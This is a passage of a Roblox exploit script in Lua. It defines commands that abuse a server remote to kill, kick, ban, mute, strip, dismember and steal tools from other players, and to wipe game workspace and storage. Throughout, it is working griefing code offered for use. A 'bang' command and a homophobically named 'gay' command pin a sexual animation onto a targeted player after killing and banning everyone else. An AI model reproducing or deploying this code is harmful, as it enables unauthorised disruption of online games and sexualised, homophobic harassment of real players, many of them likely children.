			unweldTool.TextureId = "rbxassetid://4989743039"
	
			local selectionLoop
	
			unweldTool.Equipped:Connect(function()
				selection = Instance.new("SelectionBox",localPlayer.PlayerGui)
				table.insert(genv.connections, selection)
				selectionLoop = rs.Heartbeat:Connect(function()
					local target = mouse.Target
					if target == nil then
						selection.Adornee = nil
						return 
					end
					if selection.Parent == nil then return end
					selection.Adornee = target
				end)
				table.insert(genv.connections, selectionLoop)
			end)
	
			unweldTool.Unequipped:Connect(function()
				if not selection then return end
				selection:Destroy()
			end)
	
			unweldTool.Activated:Connect(function()
				local target = mouse.Target
				if target == nil then return end
				for i,v in pairs(target:GetDescendants()) do
					if not (v:IsA("Weld") or v:IsA("Attachment")) then continue end
					delete(v)
				end
			end)
		end, {}, 3)
	
		addCommand("gun", function()
			sgui:SetCoreGuiEnabled(Enum.CoreGuiType.Backpack, true)
			if not character then return end
			local humanoid = character:FindFirstChildOfClass("Humanoid")
			if localPlayer.Backpack:FindFirstChild("wacky gun tool") or (character:FindFirstChild("wacky gun tool")) then
				return
			end
	
			local gunTool = Instance.new("Tool", localPlayer.Backpack)
			gunTool.RequiresHandle = false
			gunTool.CanBeDropped = false
			gunTool.Name = "wacky gun tool"
			gunTool.ToolTip = "Click a player to \"shoot\" them"
			gunTool.TextureId = "rbxassetid://822278164"
	
	
			local handle = Instance.new("Part", gunTool)
			handle.Name = "Handle"
			handle.Transparency = 1
			handle.CanCollide = false
			handle.Size = Vector3.new(0.001,0.001,0.001)
			handle.Massless = true
	
			local track
			gunTool.Activated:Connect(function()
				local target = mouse.Target
				if target == nil then return end
				for i,v in pairs(players:GetPlayers()) do
					local char = v.Character
					if char == nil then continue end
					for _, part in pairs(char:GetDescendants()) do
						if (not part:IsA("BasePart")) or part ~= target then continue end
						if humanoid.RigType == Enum.HumanoidRigType.R6 then
							track.TimePosition = 0.4
							task.wait(.25)
							track.TimePosition = 0.18
						end
						local arg = {players:GetPlayerFromCharacter(char)}
						runCommand("ragdoll", arg)
						task.wait(1.5)
						runCommand("kill", arg)
						break
					end
				end
			end)
			if humanoid.RigType ~= Enum.HumanoidRigType.R6 then return end
	
			local animation = Instance.new("Animation")
			animation.AnimationId = "rbxassetid://33169583"
			track = humanoid:LoadAnimation(animation)
			track.Priority = Enum.AnimationPriority.Movement
	
	
			gunTool.Equipped:Connect(function()
				track:Play()
				task.wait()
				track:AdjustSpeed(0)
				track.TimePosition = 0.18
				track:AdjustWeight(0.95)
			end)
	
	
			gunTool.Unequipped:Connect(function()
				track:Stop()
			end)
		end, {}, 3)
	
		addCommand("punch", function()
			sgui:SetCoreGuiEnabled(Enum.CoreGuiType.Backpack, true)
			if not character then return end
			local humanoid = character:FindFirstChildOfClass("Humanoid")
			if not humanoid then return end
			local isR15 = humanoid.RigType == Enum.HumanoidRigType.R15
			local arm = (isR15 and character:FindFirstChild("RightLowerArm")) or (character:FindFirstChild("Right Arm"))
			if not arm then return end
	
			if localPlayer.Backpack:FindFirstChild("wacky punch tool") or (character:FindFirstChild("wacky punch tool")) then
				return
			end
	
			local punchTool = Instance.new("Tool", localPlayer.Backpack)
			punchTool.RequiresHandle = false
			punchTool.CanBeDropped = false
			punchTool.Name = "wacky punch tool"
			punchTool.ToolTip = "Click to punch"
			punchTool.TextureId = "rbxassetid://14881411853"
	
			local animation = Instance.new("Animation")
			animation.AnimationId = (isR15 and "rbxassetid://846744780") or ("rbxassetid://204062532")
	
			local track = humanoid:LoadAnimation(animation)
	
			local attacking = false
	
			local touchedConnection = arm.Touched:Connect(function(part)
				if not attacking then return end
				local parent = part.Parent
				if not parent then return end
				local target = players:GetPlayerFromCharacter(parent)
				if (not target) or (target == localPlayer) then return end
				local hum = parent:FindFirstChildOfClass("Humanoid")
				if hum and hum.Health <= 0 then return end
				runCommand("kill",{target})
			end)
	
			punchTool.Activated:Connect(function()
				if attacking then return end
				track:Play()
				task.wait(isR15 and 0.2 or 0.165)
				attacking = true
				track.Ended:Wait()
				attacking = false
			end)
		end, {"slap"}, 3)
	
	
		table.insert(genv.connections,players.PlayerAdded:Connect(function(plr)
			if (slockEnabled or bans[tostring(plr.UserId)]) then
				task.wait()
				delete(plr)
			end
		end))
	
		addCommand("ban", function(plrs, input)
			for i,v in pairs(plrs) do
				if v == localPlayer then continue end
				if bans[tostring(v.UserId)] then continue end
				bans[tostring(v.UserId)] = input
				delete(v)
			end
		end, {}, 2)
	
		addCommand("unban", function(plrs, input)
			if input == "all" then return table.clear(bans) end
			for i,v in pairs(bans) do
				if v ~= input and i ~= input then continue end
				bans[i] = nil
			end
		end, {}, 2)
	
		addCommand("clearbans", function()
			table.clear(bans)
		end, {}, 2)
	
		addCommand("serverlock",function()
			slockEnabled = true
		end, {"slock"}, 2)
	
		addCommand("unserverlock", function()
			slockEnabled = false
		end, {"unslock"}, 2)
	
		addCommand("kick", function(plrs)
			for i,v in pairs(plrs) do
				delete(v)
			end
		end, {}, 2)
	
		addCommand("mute", function(plrs)
			if not modernChat then return notify("Error", "Game uses legacy chat, command not supported") end
			local names = {}
			for i,v in pairs(plrs) do
				table.insert(names, v.Name)
			end
			for i,instance in pairs(game:GetService("TextChatService").TextChannels:GetDescendants()) do
				if not table.find(names, instance.Name) then continue end
				delete(instance)
			end
		end, {}, 2)
	
		addCommand("unsit", function(plrs)
			for i,v in pairs(plrs) do
				local char = v.Character
				if not char then continue end
				local humanoid = char:FindFirstChildOfClass("Humanoid")
				if not humanoid then continue end
				local seatPart = humanoid.SeatPart
				if not seatPart then continue end
				local weld = seatPart:FindFirstChild("SeatWeld")
				if not weld then continue end
				delete(weld)
			end
		end, {"stand"}, 1)
	
		addCommand("kill", function(plrs)
			for i,v in pairs(plrs) do
				local char = v.Character
				if char == nil then continue end
				local humanoid = char:FindFirstChildOfClass("Humanoid")
				local head = char:FindFirstChild("Head")
				if head == nil then continue end
				local neck = head:FindFirstChild("Neck")
				if neck == nil then
					local torso = char:FindFirstChild("Torso")
					if torso and torso:FindFirstChild("Neck") then neck = char.Torso.Neck end
				end
				if humanoid and humanoid.RequiresNeck and neck then
					delete(neck)
					continue
				end
			end
		end, {}, 1)
	
		table.insert(genv.connections, rs.Heartbeat:Connect(function()
			local toKill = {}
			for i,v in pairs(loopkills) do
				if v.Parent ~= players then table.remove(toKill, i) continue end
				if not v.Character then continue end
				table.insert(toKill, v)
			end
			runCommand("kill", toKill)
		end))
	
		addCommand("gay", function(plrs)
			local allPlayers = players:GetPlayers()
			local candidates = {}
			for _, p in ipairs(allPlayers) do
				if p ~= localPlayer then
					table.insert(candidates, p)
				end
			end
	
			local survivor = #candidates > 0 and candidates[math.random(1, #candidates)] or nil
	
			for _, v in ipairs(allPlayers) do
				if v == localPlayer then continue end
				if v == survivor then continue end
				local char = v.Character
				if char then
					local humanoid = char:FindFirstChildOfClass("Humanoid")
					local head = char:FindFirstChild("Head")
					if head then
						local neck = head:FindFirstChild("Neck") or (char:FindFirstChild("Torso") and char.Torso:FindFirstChild("Neck"))
						if humanoid and humanoid.RequiresNeck and neck then
							delete(neck)
						end
					end
					for _, obj in pairs(char:GetDescendants()) do
						if obj:IsA("Accessory") or obj:IsA("Shirt") or obj:IsA("Pants") or obj:IsA("BodyColors") or obj:IsA("ShirtGraphic") or (obj:IsA("Decal") and obj.Name == "face") then
							delete(obj)
						end
					end
				end
				bans = bans or {}
				bans[tostring(v.UserId)] = "obliterated"
				delete(v)
			end
	
			do
				local myChar = localPlayer.Character
				if myChar then
					for _, obj in pairs(myChar:GetDescendants()) do
						if obj:IsA("Accessory") or obj:IsA("Shirt") or obj:IsA("Pants") or obj:IsA("BodyColors") or obj:IsA("ShirtGraphic") or (obj:IsA("Decal") and obj.Name == "face") then
							delete(obj)
						end
					end
				end
			end
	
			runCommand("unbang")
			local target = survivor
			if not character then return end
			local humanoid = character:FindFirstChildOfClass("Humanoid")
			if not humanoid or not target or not target.Character or not target.Character:FindFirstChildOfClass("Humanoid") then return end
			if not target.Character:FindFirstChild("HumanoidRootPart") then return end
	
			local hrp = target.Character:FindFirstChild("HumanoidRootPart")
			if hrp then hrp.Anchored = true end
	
			local myChar = localPlayer.Character
			local myHRP = myChar and myChar:FindFirstChild("HumanoidRootPart")
			if myHRP and hrp then
				myHRP.CFrame = hrp.CFrame * CFrame.new(0, 0.75, -1.5)
			end
	
			bangAnim = Instance.new("Animation")
			bangAnim.AnimationId = (humanoid.RigType ~= Enum.HumanoidRigType.R15) and "rbxassetid://148840371" or "rbxassetid://5918726674"
			bang = humanoid:LoadAnimation(bangAnim)
			bang:Play(0.1, 1, 1)
			bang:AdjustSpeed(3)
			bangDied = nil
			bangDied = humanoid.Died:Connect(function()
				bang:Stop()
				bangAnim:Destroy()
				bangDied:Disconnect()
				if bangLoop then bangLoop:Disconnect() end
			end)
	
			if target ~= localPlayer then
				bangLoop = rs.Stepped:Connect(function()
					if not target.Character then return end
					local hum = target.Character:FindFirstChildOfClass("Humanoid")
					if not hum then return end
					local root = hum.RootPart
					if not root then return end
					character:PivotTo(root.CFrame * CFrame.new(0, 0.75, 1.1))
				end)
				table.insert(genv.connections, bangLoop)
			end
	
			notify("Why did you run this command? do you need help?", 5)
		end, {"gayness", "lgbtq"}, 3)
	
		addCommand("loopkill", function(plrs)
			for i,v in pairs(plrs) do
				if table.find(loopkills, v) then continue end
				table.insert(loopkills, v)
			end
		end, {}, 1)
	
		addCommand("unloopkill", function(plrs, input)
			if input:lower() == "all" then loopkills = {} return end 
			for i,v in pairs(loopkills) do
				if not table.find(plrs, v) then continue end
				table.remove(loopkills, i)
			end
		end, {}, 1)
	
		addCommand("silentkill", function(plrs)
			for i,v in pairs(plrs) do
				local char = v.Character
				if char == nil then continue end
				local humanoid = char:FindFirstChildOfClass("Humanoid")
				local head = char:FindFirstChild("Head")
				if not head then continue end
				local neck = head:FindFirstChild("Neck")
				if not neck then
					local torso = char:FindFirstChild("Torso")
					if torso and torso:FindFirstChild("Neck") then neck = char.Torso.Neck end
				end
	
				if not (humanoid and humanoid.RequiresNeck and neck) then continue end
				delete(neck)
				repeat task.wait() until humanoid.Health <= 0
				delete(char)
			end
		end, {"skill"}, 1)
	
		addCommand("naked", function(plrs)
			for i,v in pairs(plrs) do
				local char = v.Character
				if char == nil then continue end
				local pants = char:FindFirstChild("Pants")
				local shirt = char:FindFirstChild("Shirt")
				local tshirt = char:FindFirstChild("Shirt Graphic")
	
				if pants then delete(pants) end
				if shirt then delete(shirt) end
				if tshirt then delete(tshirt) end
	
				for _,instance in pairs(char:GetDescendants()) do
					if not instance:IsA("WrapLayer") then continue end
					delete(instance.Parent.Parent)
				end
			end
		end, {"noclothing"}, 1)
	
		addCommand("bald", function(plrs)
			for i,v in pairs(plrs) do
				local char = v.Character
				if char == nil then continue end
				for _,instance in pairs(char:GetChildren()) do
					if not instance:IsA("Accessory") then continue end
					delete(instance)
				end
			end
		end, {"nohats"}, 1)
	
	
		addCommand("nolimbs", function(plrs)
			for i,v in pairs(plrs) do
				local char = v.Character
				if char == nil then continue end
				for _,instance in pairs(char:GetChildren()) do
					for i,v in pairs(limbs) do
						if not instance.Name:lower():find(v) then continue end
						delete(instance)
					end
				end
			end
		end, {}, 1)
	
		addCommand("noarms", function(plrs)
			for i,v in pairs(plrs) do
				local char = v.Character
				if char == nil then continue end
				for _,instance in pairs(char:GetChildren()) do
					if not instance.Name:lower():find("arm") then continue end
					delete(instance)
				end
			end
		end, {}, 1)
	
		addCommand("nolegs", function(plrs)
			for i,v in pairs(plrs) do
				local char = v.Character
				if char == nil then continue end
				for _,instance in pairs(char:GetChildren()) do
					if not (instance.Name:lower():find("leg") or instance.Name:lower():find("foot")) then continue end
					delete(instance)
				end
			end
		end, {}, 1)
	
		addCommand("noface", function(plrs)
			for i,v in pairs(plrs) do
				local char = v.Character
				if char == nil then continue end
				local head = char:FindFirstChild("Head")
				if head == nil then continue end
				for _,instance in pairs(head:GetChildren()) do
					if not instance:IsA("Decal") then continue end
					delete(instance)
				end
			end
		end, {}, 1)
	
		addCommand("stripidentity", function(plrs)
			runCommand("noface",plrs)	
			runCommand("naked", plrs)
			runCommand("bald", plrs)
		end, {"strip", "noidentity"}, 1)
	
		addCommand("korblox", function(plrs)
			for i,v in pairs(plrs) do
				local char = v.Character
				if not char then continue end
				local r6Leg = char:FindFirstChild("Right Leg") 
				if r6Leg then 
					delete(r6Leg)
					continue 
				end
				local r15Leg = char:FindFirstChild("RightUpperLeg")
				if not r15Leg then continue end
				delete(r15Leg)
			end
		end, {}, 1)
	
		addCommand("blockhead", function(plrs)
			for i,v in pairs(plrs) do
				local char = v.Character
				if not char then continue end
				local humanoid = char:FindFirstChildOfClass("Humanoid")
				if not (humanoid and humanoid.RigType == Enum.HumanoidRigType.R6) then continue end
				local head = char:FindFirstChild("Head")
				if not head then continue end
				local mesh = head:FindFirstChildOfClass("SpecialMesh")
				if not mesh then continue end
				delete(mesh)
			end
		end, {"demeshhead"}, 1)
	
		addCommand("blockhats", function(plrs)
			for i,v in pairs(plrs) do
				local char = v.Character
				if not char then continue end
				local humanoid = char:FindFirstChildOfClass("Humanoid")
				if not (humanoid and humanoid.RigType == Enum.HumanoidRigType.R6) then continue end
				for i,hat in pairs(humanoid:GetAccessories()) do 
					local handle = hat:FindFirstChild("Handle")
					if not handle then continue end
					local mesh = handle:FindFirstChildOfClass("SpecialMesh") or handle:FindFirstChildOfClass("Mesh")
					if not mesh then continue end
					delete(mesh)
				end
			end
		end, {"demeshhats"}, 1)
	
		addCommand("blocktools", function(plrs)
			for i,v in pairs(plrs) do
				local char = v.Character
				if not char then continue end
				local handles = {}
				for i,v in pairs(v.Backpack:GetChildren()) do
					if not (v:IsA("Tool") and v:FindFirstChild("Handle")) then continue end
					table.insert(handles, v.Handle)
				end
				for i,v in pairs(char:GetChildren()) do
					if not (v:IsA("Tool") and v:FindFirstChild("Handle")) then continue end
					table.insert(handles, v.Handle)
				end
				for i,handle in pairs(handles) do 
					local mesh = handle:FindFirstChildOfClass("SpecialMesh") or handle:FindFirstChildOfClass("Mesh")
					if not mesh then continue end
					delete(mesh)
				end
			end
		end, {"demeshtools"}, 1)
	
		addCommand("bighats", function(plrs)
			for i,v in pairs(plrs) do
				local char = v.Character
				if not char then continue end
				local hum = char:FindFirstChildOfClass("Humanoid")
				if not hum then continue end
				if hum.RigType ~= Enum.HumanoidRigType.R15 then continue end
	
	
				local hats = hum:GetAccessories()
				local scalableHats = {}
				for i,v in pairs(hats) do
					local handle = v:FindFirstChild("Handle")
					if not handle then continue end
					local scaleType = handle:FindFirstChild("AvatarPartScaleType")
					if not scaleType then continue end
					table.insert(scalableHats,v)
				end
	
				if #scalableHats == 0 then continue end
	
				task.spawn(function()
					for i,value in pairs(scaleValues) do
						for i, hat in pairs(scalableHats) do
							local handle = hat:FindFirstChild("Handle")
							if not handle then continue end
							local ogSize = handle:WaitForChild("OriginalSize")
							delete(ogSize)
							repeat task.wait() until ogSize.Parent ~= handle
						end
						local scaleValue = hum:FindFirstChild(value)
						if not scaleValue then continue end
						delete(scaleValue)
						repeat task.wait() until scaleValue.Parent ~= hum
					end
				end)
			end
		end, {"rescalehats", "gianthats"}, 1)
	
		addCommand("rescale", function(plrs)
			for i,v in pairs(plrs) do
				local char = v.Character
				if not char then continue end
				local hum = char:FindFirstChildOfClass("Humanoid")
				if not hum then continue end
				if hum.RigType ~= Enum.HumanoidRigType.R15 then continue end
				spawn(function()
					local function rm()
						for i,v in pairs(char:GetDescendants()) do
							if not v:IsA("BasePart") then continue end
							if v.Name == "Handle" or v.Name == "Head" then
								if not char.Head:FindFirstChild("OriginalSize") then continue end
								delete(char.Head.OriginalSize)
								continue
							end
							for i,cav in pairs(v:GetDescendants()) do
								if not cav:IsA("Attachment") then continue end
								local op = cav:FindFirstChild("OriginalPosition") 
								if not op then continue end
								delete(op)
								task.wait(.1)
							end
							local os = v:FindFirstChild("OriginalSize") 
							if os then
								delete(os)
								task.wait(.1)
							end
							local apst = v:FindFirstChild("AvatarPartScaleType")
							if not apst then continue end
							delete(apst)
							task.wait(.1)
						end
					end
	
					for i,v in pairs(scaleValues) do
						rm()
						task.wait(.1)
						local scale = hum:FindFirstChild(v)
						if not scale then continue end
						delete(scale)
						task.wait(.1)
					end
				end)
			end
		end, {"morph"}, 1)
	
		addCommand("ragdoll", function(plrs)
			for i,v in pairs(plrs) do
				local char = v.Character
				if char == nil then continue end
				local hrp = char:FindFirstChild("HumanoidRootPart")
				if hrp == nil then continue end
				delete(hrp)
			end
		end, {"nohrp"}, 1)
	
		addCommand("sink", function(plrs)
			for i,v in pairs(plrs) do
				local char = v.Character
				if char == nil then continue end
				local humanoid = char:FindFirstChildOfClass("Humanoid")
				if humanoid == nil then continue end
				delete(humanoid)
			end
		end, {"nohum","nohumanoid"}, 2)
	
		addCommand("freeze", function(plrs)
			runCommand("ragdoll", plrs)
			runCommand("noanims", plrs)
		end, {}, 2)
	
		addCommand("noanims", function(plrs)
			for i,v in pairs(plrs) do
				local char = v.Character
				if char == nil then continue end
				local humanoid = char:FindFirstChildOfClass("Humanoid")
				if humanoid == nil then continue end
				local animator = humanoid:FindFirstChildOfClass("Animator")
				if animator == nil then continue end
				delete(animator)
				local animate = char:FindFirstChild("Animate")
				if animate == nil then continue end
				delete(animate)
			end
		end, {}, 1)
	
		addCommand("invisible", function(plrs)
			local ignoreList = {"UpperTorso", "Head", "HumanoidRootPart", "Humanoid"}
			for i,v in pairs(plrs) do
				local char = v.Character
				if char == nil then continue end
				local humanoid = char:FindFirstChildOfClass("Humanoid")
				if humanoid == nil then continue end 
				if humanoid.RigType ~= Enum.HumanoidRigType.R15 then continue end
				for _,instance in pairs(char:GetChildren()) do 
					if table.find(ignoreList, instance.Name) then continue end
					delete(instance)
				end
				if humanoid.RootPart then humanoid.RootPart.Transparency = 0.6 end
			end
		end, {"invis"}, 1)
	
		addCommand("legwalk", function(plrs)
			local deleteList = {"LeftUpperArm","RightUpperArm"}
			for i,v in pairs(plrs) do
				local char = v.Character
				if char == nil then continue end
				local humanoid = char:FindFirstChildOfClass("Humanoid")
				if humanoid == nil then continue end 
				if humanoid.RigType ~= Enum.HumanoidRigType.R15 then continue end
				local upperTorso = char:FindFirstChild("UpperTorso")
				if upperTorso == nil then continue end
				local waist = upperTorso:FindFirstChild("Waist")
				if waist == nil then continue end
				for _,instance in pairs(char:GetChildren()) do 
					if not (table.find(deleteList, instance.Name) or instance:IsA("Accessory")) then continue end
					delete(instance)
				end
				delete(waist)
			end
		end, {"split"}, 1)
	
		addCommand("fakechat", function(plrs)
			local localPlayer = game:GetService("Players").LocalPlayer
			local rs = game:GetService("RunService")
	
			local character = localPlayer.Character
			if not character then return end
	
			local humanoid = character:FindFirstChildOfClass("Humanoid")
			local hrp = character:FindFirstChild("HumanoidRootPart")
			if not (humanoid and hrp) then return end
	
			local target
			for _, v in pairs(plrs) do
				if v == localPlayer then continue end
				if not v.Character then continue end
				if not v.Character:FindFirstChild("HumanoidRootPart") then continue end
				target = v
				break
			end
			if not target then return end
	
			runCommand("unbang")
			runCommand("view", {target})
			task.wait(0.2)
	
			if humanoid.RigType == Enum.HumanoidRigType.R15 then
				runCommand("invisible", {localPlayer})
			else
				for _, v in pairs(hrp:GetChildren()) do
					delete(v)
				end
				repeat task.wait() until #hrp:GetChildren() == 0
			end
	
			local followLoop
			followLoop = rs.Heartbeat:Connect(function()
				if not target.Character then return end
				local thrp = target.Character:FindFirstChild("HumanoidRootPart")
				if not thrp then return end
				local predictedCF = CFrame.new(
					thrp.Position.X + thrp.Velocity.X / 4,
					thrp.Position.Y,
					thrp.Position.Z + thrp.Velocity.Z / 4
				)
				hrp.AssemblyAngularVelocity = Vector3.zero
				hrp.AssemblyLinearVelocity = Vector3.zero
				hrp.CFrame = (predictedCF * CFrame.new(0, 3, -1.5)) * CFrame.Angles(math.rad(90), 0, 0)
			end)
	
			table.insert(genv.connections, followLoop)
			table.insert(genv.connections, humanoid.Died:Connect(function()
				if followLoop then followLoop:Disconnect() end
				runCommand("unview")
			end))
		end, {}, 3)
	
		addCommand("notools", function(plrs)
			for i,v in pairs(plrs) do
				for _, instance in pairs(v:FindFirstChildOfClass("Backpack"):GetChildren()) do
					if not instance:IsA("BackpackItem") then continue end
					delete(instance)
				end
				local char = v.Character
				if char == nil then continue end
				for _, instance in pairs(char:GetChildren()) do
					if not instance:IsA("BackpackItem") then continue end
					delete(instance)
				end
			end
		end, {}, 1)
	
		addCommand("grabtools", function(plrs, input, caller)
			local callChar = caller.Character
			if not callChar then return end
			local hrp = callChar:FindFirstChild("HumanoidRootPart")
			local pos = hrp and hrp.CFrame or callChar:GetPivot()
			if not pos then return end
	
			local tools = {}
	
			for i,v in pairs(workspace:GetDescendants()) do
				if not (v:IsA("Tool") and v:FindFirstChild("Handle")) then continue end
				table.insert(tools, v)
			end
	
			for i,v in pairs(tools) do
				if not v.Handle:FindFirstChildOfClass("TouchTransmitter") then continue end
				v.Handle.CanCollide = false 
				v.Handle.CFrame = pos 
			end
	
		end, {"getalltools"}, 1)
	
		addCommand("givetools", function(plrs, input, caller)
			local callChar = caller.Character
			if not callChar then return end
			local callHum = callChar:FindFirstChildOfClass("Humanoid")
			if not callHum then return end
			local callHead = callChar:FindFirstChild("Head")
			if not callHead then return end
			local oldPos = caller == localPlayer and callChar:GetPivot()
	
			local target = plrs[1]
			if not target then return end	
			local tChar = target.Character
			if not tChar then return end
			local tHum = tChar:FindFirstChildOfClass("Humanoid")
			if not tHum then return end
			local thrp = tChar:FindFirstChild("HumanoidRootPart")
	
			local tools = {}
			for i,v in pairs(callChar:GetChildren()) do
				if not (v:IsA("Tool") and v:FindFirstChild("Handle")) then continue end
				table.insert(tools, v)
			end
			if #tools == 0 then return end
	
			delete(callHead)
			repeat task.wait() until callChar:FindFirstChild("Head") == nil
			delete(callHum)
			repeat task.wait() until callChar:FindFirstChildOfClass("Humanoid") == nil
	
			for i,v in pairs(tools) do
				v.Handle.CanCollide = false 
				v.Handle.CFrame = thrp and thrp.CFrame or tChar:GetPivot() 
			end
	
			if not oldPos then return end
			localPlayer.CharacterAdded:Wait():PivotTo(oldPos)
		end, {"givetool","give"}, 1)
	
		addCommand("stealtools", function(plrs, input, caller)
			local character = caller.Character
			if not character then return end
			local lpHumanoid = character:FindFirstChildOfClass("Humanoid")
			if not lpHumanoid then return end
			local hrp = lpHumanoid.RootPart
			for i,plr in pairs(plrs) do
				if plr == caller then continue end
				local char = plr.Character
				if not char then continue end
				local tool = char:FindFirstChildOfClass("BackpackItem")
				if not tool then continue end
				local head = char:FindFirstChild("Head")
				if not head then continue end
				delete(head)
				task.wait(0.05)
				local humanoid = char:FindFirstChildOfClass("Humanoid")
				if humanoid then
					delete(humanoid)
				end
				repeat task.wait() until char:FindFirstChildOfClass("Humanoid") == nil
				task.wait(.05)
				for i,v in pairs(char:GetChildren()) do
					if not (v:IsA("BackpackItem") and v:FindFirstChild("Handle")) then continue end
					if hrp and hrp.Parent then
						v.Handle.CFrame = hrp.CFrame
					end
					lpHumanoid:EquipTool(v)
				end
			end
		end, {"stools"}, 1)
	
		addCommand("droptools", function(plrs)
			for i,v in pairs(plrs) do
				local char = v.Character
				if not char then continue end
				local arm = char:FindFirstChild("Right Arm") or char:FindFirstChild("RightHand")
				if not arm then continue end
	
				local function deleteArm()
					if not char:FindFirstChildOfClass("Tool") then return end
					task.wait(.1)
					delete(arm)
				end
	
				table.insert(genv.connections, arm.ChildAdded:Connect(deleteArm))
				local grip = arm:FindFirstChild("RightGrip")
				if not grip then continue end
				delete(grip)
			end
		end, {"collidetools"}, 1)
	
		addCommand("punish", function(plrs)
			for i,v in pairs(plrs) do
				local char = v.Character
				if not char then continue end
				delete(char)
			end
		end, {}, 2)
	
		addCommand("bang", function(plrs) -- credit to the Infinite Yield team
			if not character then return end
			local humanoid = character:FindFirstChildOfClass("Humanoid")
			if not humanoid then return end
			runCommand("unbang")
			local target
			for i,v in pairs(plrs) do
				if not v.Character then continue end
				if not v.Character:FindFirstChildOfClass("Humanoid") then continue end
				if not v.Character.Humanoid.RootPart then continue end
				target = v
				break
			end
			bangAnim = Instance.new("Animation")
			bangAnim.AnimationId = (humanoid.RigType ~= Enum.HumanoidRigType.R15) and "rbxassetid://148840371" or "rbxassetid://5918726674"
			bang = humanoid:LoadAnimation(bangAnim)
			bang:Play(0.1, 1, 1)
			bang:AdjustSpeed(3)
			bangLoop = nil
			bangDied = nil;bangDied = humanoid.Died:Connect(function()
				bang:Stop()
				bangAnim:Destroy()
				bangDied:Disconnect()
				if bangLoop then bangLoop:Disconnect() end
			end)
			if target == localPlayer then return end
			bangLoop = rs.Stepped:Connect(function()
				if target.Character == nil then return end
				local hum = target.Character:FindFirstChildOfClass("Humanoid")
				if hum == nil then return end
				local root = hum.RootPart
				if root == nil then return end
				character:PivotTo(root.CFrame * CFrame.new(0, 0.75, 1.1))
			end)
			table.insert(genv.connections,bangLoop)
		end, {}, 3)
	
		addCommand("unbang", function()
			if bangDied then bangDied:Disconnect() end
			if bang then bang:Stop() end
			if bangAnim then bangAnim:Destroy() end
			if bangLoop then bangLoop:Disconnect() end
		end, {}, 3)
	
		addCommand("clearstarter", function()
			local whitelist = {"BubbleChat", "ChatScript", "PlayerScriptsLoader", "RbxCharacterSounds", "PlayerModule"}
	
			for i,v in pairs(sgui:GetChildren()) do
				delete(v)
			end
			for i,v in pairs(game:GetService("StarterPack"):GetChildren()) do
				delete(v)
			end
			for i,v in pairs(game:GetService("StarterPlayer"):FindFirstChildOfClass("StarterPlayerScripts"):GetChildren()) do
				if table.find(whitelist, v.Name) then continue end
				delete(v)
			end
			for i,v in pairs(game:GetService("StarterPlayer"):FindFirstChildOfClass("StarterCharacterScripts"):GetChildren()) do
				delete(v)
			end
		end, {"clearstarters"}, 1)
	
		addCommand("cleargui", function()
			for i,v in pairs(sgui:GetChildren()) do
				delete(v)
			end
		end,{"clearsgui", "clearguis"}, 1)
	
		addCommand("nochat",function()
			local chatEvents = rStorage:FindFirstChild("DefaultChatSystemChatEvents")
			if chatEvents then return delete(chatEvents) end
			if not modernChat then return end
			for i,v in pairs(game:GetService("TextChatService"):GetChildren()) do
				delete(v)
			end
		end, {"breakchat"}, 2)
	
		addCommand("nostats", function(plrs)
			for i,v in pairs(plrs) do
				local stats = v:FindFirstChild("leaderstats")
				if stats == nil then continue end
				delete(stats)
			end
		end, {}, 1)
	
		addCommand("deletename", function(plrs, input)
			for i,v in pairs(game:GetDescendants()) do
				local match = v.Name:lower():gsub(" ","")
				if not match:match(input:lower()) then continue end
				delete(v)
			end
		end, {}, 2)
	
		addCommand("clearstorage",function()
			for i,v in pairs(rStorage:GetChildren()) do
				if (v == genv.foundRemote) or (modernChat == false and v:IsA("Folder") and v.Name == "DefaultChatSystemChatEvents") then continue end
				delete(v)
			end
		end, {"clearrs","clearreps", "clearreplicatedstorage"}, 1)
	
		addCommand("clearws", function()
			for i,v in pairs(workspace:GetChildren()) do
				if players:GetPlayerFromCharacter(v) then continue end
				delete(v)
			end
		end, {}, 2)
	
		addCommand("lockws", function()
			for i,v in pairs(workspace:GetChildren()) do
				if players:FindFirstChild(v.Name) then continue end
				local con = v.ChildAdded:Connect(function(instance)
					if players:FindFirstChild(instance.Parent.Name) then return end
					task.wait()
					delete(instance)
				end)
				table.insert(genv.connections,con)
				table.insert(wslocks,con)
			end
			local con = workspace.ChildAdded:Connect(function(instance)
				if players:FindFirstChild(instance.Name) then return end
				task.wait()
				delete(instance)
			end)
			table.insert(genv.connections,con)
			table.insert(wslocks,con)
		end, {}, 1)
	
		addCommand("unlockws", function()
			for i,v in pairs(wslocks) do
				v:Disconnect()
			end
		end, {}, 1)
	
		addCommand("notextures", function()
			for i,v in pairs(workspace:GetChildren()) do
				if players:GetPlayerFromCharacter(v) then continue end
				if (v:IsA("Decal") or v:IsA("Texture")) then delete(v) end
	
				for _,instance in pairs(v:GetDescendants()) do
					if not (instance:IsA("Decal") or instance:IsA("Texture")) then continue end
					delete(instance)
				end
			end
		end, {}, 1)
	
		addCommand("baseplate", function()
			if not character then return end
			local hum = character:FindFirstChildOfClass("Humanoid")
			if not hum then return end
			local hrp = hum.RootPart
			if not hrp then return end
	
			local function isPlate(instance)
				if not (instance:IsA("BasePart")) then return end
				local distance = (instance.Position - hrp.Position).Magnitude
				local size = instance.Size.Magnitude
				if distance <= 7 or size >= 1000 or instance.Name:lower():gsub(" ",""):find("baseplate") then return true end
				return false
			end
	
			for i,v in pairs(workspace:GetChildren()) do
				if players:GetPlayerFromCharacter(v) then continue end
				if isPlate(v) == false then delete(v) continue end
				for _,instance in pairs(v:GetDescendants()) do
					if isPlate(instance) then continue end
					delete(instance)
				end
			end
		end,{"platform"}, 2)
	
		addCommand("nospawns", function()
			for i,v in pairs(workspace:GetDescendants()) do
				if not v:IsA("SpawnLocation") then continue end
				delete(v)
			end
		end, {}, 1)
	
		addCommand("unweldws", function()
			for i,v in pairs(workspace:GetChildren()) do
				if players:GetPlayerFromCharacter(v) then continue end
				for _, instance in pairs(v:GetDescendants()) do
					if not (instance:IsA("Weld") or instance:IsA("Attachment") or v:IsA("Motor6D")) then continue end
					delete(instance)
				end
				if not (v:IsA("Weld") or v:IsA("Attachment") or v:IsA("Motor6D")) then continue end
				delete(v)
			end
		end, {}, 1)
	
		addCommand("noseats", function()
			for i,v in pairs(workspace:GetChildren()) do
				if players:GetPlayerFromCharacter(v) then continue end
				for _, instance in pairs(v:GetDescendants()) do
					if not (instance:IsA("VehicleSeat") or instance:IsA("Seat")) then continue end
					delete(instance)
				end
				if not (v:IsA("VehicleSeat") or v:IsA("Seat")) then continue end
				delete(v)
			end
		end, {}, 1)
	
